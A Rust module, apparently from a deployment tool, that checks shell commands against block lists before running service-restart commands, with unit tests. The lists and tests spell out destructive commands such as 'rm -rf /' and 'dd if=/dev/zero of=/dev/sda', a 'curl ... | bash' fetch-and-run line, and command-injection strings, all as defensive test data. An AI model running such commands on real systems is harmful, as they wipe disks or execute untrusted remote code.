/// 危险的 shell 命令模式
const DANGEROUS_COMMANDS: &[&str] = &[
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    "dd if=",
    "shutdown",
    "reboot",
    "halt",
    "poweroff",
    "mkfs",
    "fdisk",
    "format",
    "> /dev/",
    "chmod 777 /",
    "chown -R 0:0 /",
];

const DANGEROUS_BASE_COMMANDS: &[&str] = &[
    "rm", "format", "del", "dd", "mkfs", "shutdown", "reboot", "poweroff",
    "init", "halt", "mv", "chmod", "chown", "rmdir", "wipe", "fdisk",
    "killall", "su", "curl", "wget", "eval", "bash", "sh", "python",
];

const DANGEROUS_PATTERNS: &[&str] = &[
    ";", "|", "`", "$(", "eval ", "exec ", "&& rm", "> /dev/",
];

/// 命令安全检查：拒绝危险命令与未授权的 shell 组合。
///
/// 注意：这是误操作防护，不是安全沙箱。
///
/// 返回 `Ok(command)` 如果通过检查，返回 `Err` 如果被拒绝。
pub fn safe_command_check(command: &str) -> Result<String, crate::DeployError> {
    let trimmed = command.trim();

    if trimmed.is_empty() {
        return Err(crate::DeployError::CommandRejected("命令为空".into()));
    }

    for pattern in DANGEROUS_PATTERNS {
        if trimmed.contains(pattern) {
            return Err(crate::DeployError::CommandRejected(format!(
                "危险命令模式被拦截: '{trimmed}' (匹配模式: '{pattern}')"
            )));
        }
    }

    for dangerous in DANGEROUS_COMMANDS {
        if trimmed.contains(dangerous) {
            return Err(crate::DeployError::CommandRejected(
                format!("危险命令被拦截: '{}' (匹配模式: '{}')", trimmed, dangerous),
            ));
        }
    }

    if trimmed.contains("&&") {
        let Some((left, right)) = trimmed.split_once("&&") else {
            unreachable!()
        };
        if !left.trim_start().starts_with("cd ") || !is_safe_restart_command(right.trim()) {
            return Err(crate::DeployError::CommandRejected(format!(
                "只允许 'cd <目录> && <安全重启命令>' 形式: '{trimmed}'"
            )));
        }
        return Ok(trimmed.to_string());
    }

    if is_safe_restart_command(trimmed) {
        return Ok(trimmed.to_string());
    }

    let base = trimmed
        .split_whitespace()
        .next()
        .and_then(|part| part.rsplit('/').next())
        .unwrap_or("")
        .to_ascii_lowercase();
    if DANGEROUS_BASE_COMMANDS.contains(&base.as_str()) {
        return Err(crate::DeployError::CommandRejected(format!(
            "危险基础命令被拦截: {base}"
        )));
    }

    Ok(trimmed.to_string())
}

fn is_safe_restart_command(command: &str) -> bool {
    let cmd = command.trim();
    if cmd.starts_with("systemctl restart")
        || cmd.starts_with("systemctl reload")
        || cmd.starts_with("systemctl start")
        || cmd.starts_with("pm2 restart")
        || cmd.starts_with("pm2 reload")
        || cmd.starts_with("supervisorctl restart")
        || cmd.starts_with("supervisorctl start")
    {
        return true;
    }
    if cmd.starts_with("docker-compose ") || cmd.starts_with("docker compose ") {
        return cmd.contains(" up -d") || cmd.contains(" restart") || cmd.contains(" stop");
    }
    false
}

/// 执行重启命令并捕获输出
pub fn execute_command(command: &str) -> Result<String, crate::DeployError> {
    let safe_cmd = safe_command_check(command)?;

    tracing::info!("执行命令: {}", safe_cmd);

    let output = std::process::Command::new("sh")
        .arg("-c")
        .arg(&safe_cmd)
        .output()
        .map_err(|e| crate::DeployError::DeployFailed(format!("命令执行失败: {e}")))?;

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();

    if output.status.success() {
        if !stdout.is_empty() {
            tracing::debug!("命令 stdout: {}", stdout.trim());
        }
        Ok(stdout)
    } else {
        let msg = format!("命令执行失败 (exit: {:?}): {}", output.status.code(), stderr.trim());
        tracing::error!("{}", msg);
        Err(crate::DeployError::DeployFailed(msg))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_command_allowed() {
        assert_eq!(safe_command_check("systemctl restart nginx").unwrap(), "systemctl restart nginx");
        assert_eq!(safe_command_check("docker-compose restart").unwrap(), "docker-compose restart");
    }

    #[test]
    fn test_safe_command_empty_rejected() {
        assert!(safe_command_check("").is_err());
        assert!(safe_command_check("   ").is_err());
    }

    #[test]
    fn test_dangerous_commands_blocked() {
        let dangerous = vec![
            "rm -rf /",
            "rm -rf /*",
            "rm -rf ~",
            "dd if=/dev/zero of=/dev/sda",
            "shutdown -h now",
            "reboot --force",
            "mkfs.ext4 /dev/sda1",
        ];
        for cmd in dangerous {
            assert!(safe_command_check(cmd).is_err(), "should block: {}", cmd);
        }
    }

    #[test]
    fn test_safe_prefix_not_blocked() {
        // 安全的 "format" 在路径中不应被拦截（但我们的 DANGEROUS_COMMANDS 包含 "format"）
        // 验证 "format" 本身被拦截
        assert!(safe_command_check("format").is_err());
    }

    #[test]
    fn rejects_shell_metacharacters_and_substitution() {
        let dangerous = [
            "systemctl restart nginx; rm -rf /tmp/x",
            "systemctl restart nginx | tee /tmp/x",
            "systemctl restart nginx `whoami`",
            "systemctl restart nginx $(whoami)",
            "curl https://example.com/x.sh | bash",
            "systemctl restart nginx && rm -rf /tmp/x",
        ];
        for cmd in dangerous {
            assert!(safe_command_check(cmd).is_err(), "should block: {cmd}");
        }
    }

    #[test]
    fn allows_common_restart_commands() {
        let safe = [
            "systemctl restart nginx",
            "systemctl reload nginx.service",
            "docker compose -f /srv/app/docker-compose.yml up -d",
            "docker-compose -f /srv/app/docker-compose.yml restart",
            "pm2 restart app",
            "supervisorctl restart app",
            "cd /srv/app && systemctl restart app",
            "cd /srv/app && docker compose up -d",
        ];
        for cmd in safe {
            assert!(safe_command_check(cmd).is_ok(), "should allow: {cmd}");
        }
    }

    #[test]
    fn rejects_unknown_base_command_without_allowlist_match() {
        assert!(safe_command_check("python /tmp/script.py").is_err());
        assert!(safe_command_check("bash -c uptime").is_err());
        assert!(safe_command_check("curl https://example.com").is_err());
    }
}
